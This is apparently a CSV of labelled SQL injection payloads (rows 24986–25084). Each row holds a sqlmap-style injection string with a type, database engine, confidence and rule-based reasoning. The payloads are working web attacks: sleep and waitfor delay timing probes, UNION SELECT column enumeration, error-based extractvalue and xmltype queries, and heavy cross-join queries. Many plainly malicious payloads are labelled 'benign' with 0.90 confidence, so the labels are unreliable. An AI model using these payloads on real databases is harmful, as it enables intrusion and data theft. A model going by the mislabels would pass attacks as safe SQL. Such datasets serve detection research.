id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
24986,"1' and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )",time_blind,generic,0.85,Signal match: dbms_pipe.receive_message → time_blind (P5),1
24987,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( 1491 = 1491",time_blind,oracle,0.85,Signal match: dbms_pipe.receive_message → time_blind (P5),1
24988,"1 ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( 7182 = 7182",time_blind,sqlite,0.85,Signal match: randomblob → time_blind (P5); DB signature: sqlite,1
24989,1 ) where 2930 = 2930,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24990,"1 ) ) as berd where 5803 = 5803 union all select null,null,null,null,null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24991,"make_set ( 8734 = 8734,sleep ( 5 ) )",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
24992,1 ) as rqac where 3381 = 3381 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24993,"1' ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( 'sqni' like 'sqni",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24994,"1' ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( 'cwjd' = 'cwjd",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
24995,"-4694' ) where 1501 = 1501 union all select 1501,1501,1501,1501,1501,1501#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24996,"1"" where 7232 = 7232 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24997,1 ) where 3381 = 3381 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24998,"1'+ ( select mumb where 4658 = 4658 or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24999,"1"" ) where 4426 = 4426 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25000,"1' where 7445 = 7445 union all select null,null,null,null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25001,"-4091"" ) ) ) union all select 6694,6694--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25002,"1%"" ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ( ""%"" = """,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25003,1' ) ) ) or sleep ( 5 ) and ( ( ( 'wuwv' = 'wuwv,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25004,"-6405' union all select 8235,8235,8235,8235,8235#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25005,"1' ) ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( 'tnfm' like 'tnfm",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25006,"1"" ) where 9062 = 9062",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25007,"1 ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( 3343 = 3343",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25008,"-8454"" or 6872 = 6872",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25009,select sleep ( 5 ) and ( 'qcsv' = 'qcsv,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25010,"-8612' ) as toeu where 6357 = 6357 or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25011,-8378%' ) union all select 5491#,union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25012,"-5193 where 2175 = 2175 union all select 2175,2175,2175,2175,2175,2175,2175,2175,2175,2175#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25013,"1"" ) as nraw where 7984 = 7984 and elt ( 3114 = 3114,sleep ( 5 ) ) #",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25014,"1%"" ) ) union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25015,1 ) where 7050 = 7050,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25016,1'|| ( select 'cgup' from dual where 5383 = 5383 waitfor delay '0:0:5'--,time_blind,mssql,0.85,Signal match: waitfor delay → time_blind (P5); DB signature: mssql,1
25017,"1"" rlike sleep ( 5 ) and ""rylv"" like ""rylv",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25018,"1' ) as elnu where 5719 = 5719 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25019,"1"" ) where 8702 = 8702 union all select null,null,null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25020,-8515' or 1329 = 9536,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25021,"-6075' union all select 9988,9988,9988,9988,9988,9988,9988,9988,9988#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25022,"1'+ ( select thmg where 2546 = 2546 or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25023,"1%"" ) ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( ""%"" = """,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25024,"1 ) ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( 2952 = 2952",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25025,1 ) where 9446 = 9446 union all select null#,union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25026,1 ) as bozx where 2160 = 2160 and sleep ( 5 ) #,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25027,1%' ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( '%' = ',time_blind,postgresql,0.85,Signal match: sleep → time_blind (P5); DB signature: postgresql,1
25028,"1 ) ) ) union all select null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25029,"1 ) where 7775 = 7775 union all select null,null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25030,1' ) ) rlike sleep ( 5 ) and ( ( 'tufg' = 'tufg,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25031,"1"" ) ) ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ( ""epwi"" like ""epwi",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25032,"1"" ) ) and 6486 = 3843 and ( ( ""fbka"" like ""fbka",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25033,1'+ ( select 'gprq' where 8928 = 8928,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25034,1' ) ) as azsd where 3870 = 3870 waitfor delay '0:0:5'--,time_blind,mssql,0.85,Signal match: waitfor delay → time_blind (P5); DB signature: mssql,1
25035,"1%"" ) ) ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( ( ""%"" = """,heavy_query,firebird,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25036,"1"""" ( .'. ( , ( .",unknown,generic,0.50,Insufficient information to classify,1
25037,"1"" ) ) as wssb where 5772 = 5772",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25038,"select pg_sleep ( 5 ) and ( ""tpry"" = ""tpry",time_blind,postgresql,0.85,Signal match: sleep → time_blind (P5); DB signature: postgresql,1
25039,"1"" ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) and ""cbck"" like ""cbck",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25040,"1%"" ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( ""%"" = """,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25041,"1' ) ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( 'gyre' = 'gyre",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25042,"1'|| ( select 'fqoz' where 9794 = 9794 union all select null,null,null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25043,"1"" ) ) or sleep ( 5 ) and ( ( ""mtmb"" like ""mtmb",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25044,1 where 7890 = 7890 or sleep ( 5 ) --,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25045,1 ) and sleep ( 5 ),time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25046,1 ) where 1013 = 1013 and 5573 = 9445#,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25047,1'|| ( select 'owzs' where 1475 = 1475 union all select null--,union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25048,"1"" ) ) as ftts where 3671 = 3671 and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25049,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) +'",heavy_query,db2,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25050,1 ) ) ) rlike sleep ( 5 ) and ( ( ( 6790 = 6790,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25051,"-9856"" union all select 9753--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25052,"-4329' ) union all select 1353,1353,1353,1353,1353,1353#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25053,"1"" union all select null,null#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25054,"1' where 6902 = 6902 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",error_based,oracle,0.85,Signal match: ctxsys.drithsx → error_based (P4); DB signature: oracle,1
25055,"-8695 union all select 6087,6087,6087,6087,6087,6087,6087,6087,6087,6087#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25056,"1"" ) where 4913 = 4913",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25057,"1%"" procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",error_based,generic,0.85,Signal match: extractvalue → error_based (P4); confidence: 0.85,1
25058,"-3031"" union all select 2681#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25059,"1"" ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ""dwpa"" = ""dwpa",time_blind,generic,0.85,Signal match: dbms_pipe.receive_message → time_blind (P5),1
25060,"1"" ) where 7914 = 7914 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #",time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25061,"1 ) as ahfj where 4776 = 4776 or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
25062,1' ) ) and 7533 = 7533 and ( ( 'ialm' = 'ialm,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25063,"1 ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( 6010 = 6010",time_blind,generic,0.85,Signal match: dbms_pipe.receive_message → time_blind (P5),1
25064,"1"" ) ) ) waitfor delay '0:0:5' and ( ( ( ""ckht"" = ""ckht",time_blind,mssql,0.85,Signal match: waitfor delay → time_blind (P5); DB signature: mssql,1
25065,"1'|| ( select 'gopc' where 7386 = 7386 and make_set ( 9375 = 7963,7963 ) ) ||'",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25066,"1"" ) where 4588 = 4588",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25067,"1%"" ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ""%"" = """,time_blind,generic,0.85,Signal match: benchmark → time_blind (P5); confidence: 0.85,1
25068,"1 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) )",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25069,"-2855' union all select 2495,2495,2495,2495,2495,2495,2495,2495,2495--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25070,"1'|| ( select 'flre' where 8250 = 8250 or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) ) ||'",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25071,"1' ) ) procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",error_based,generic,0.85,Signal match: extractvalue → error_based (P4); confidence: 0.85,1
25072,"1"" ) ) ) and make_set ( 7809 = 9564,9564 ) and ( ( ( ""jggk"" like ""jggk",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25073,"1 ) ) as wezj where 2869 = 2869 and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25074,1' ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( 'fupe' = 'fupe,time_blind,postgresql,0.85,Signal match: sleep → time_blind (P5); DB signature: postgresql,1
25075,-5615' ) where 5931 = 5931 or 8450 = 9229,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25076,"-5143'+ ( select 'zyrr' where 8405 = 8405 union all select 8405,8405,8405,8405#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25077,"1' ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( 'bdsq' like 'bdsq",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25078,"-8200' in boolean mode ) union all select 3360,3360--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25079,1%' ) or sleep ( 5 ) #,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
25080,"1'+ ( select 'lawc' where 1171 = 1171 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25081,1'|| ( select 'ypqa' where 1961 = 1961 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) ) ||',time_blind,postgresql,0.85,Signal match: sleep → time_blind (P5); DB signature: postgresql,1
25082,"-3767' ) as eefl where 8260 = 8260 union all select 8260,8260,8260,8260,8260,8260,8260#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
25083,-1127 or 7391 = 4954,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
25084,"1"" ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) )",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
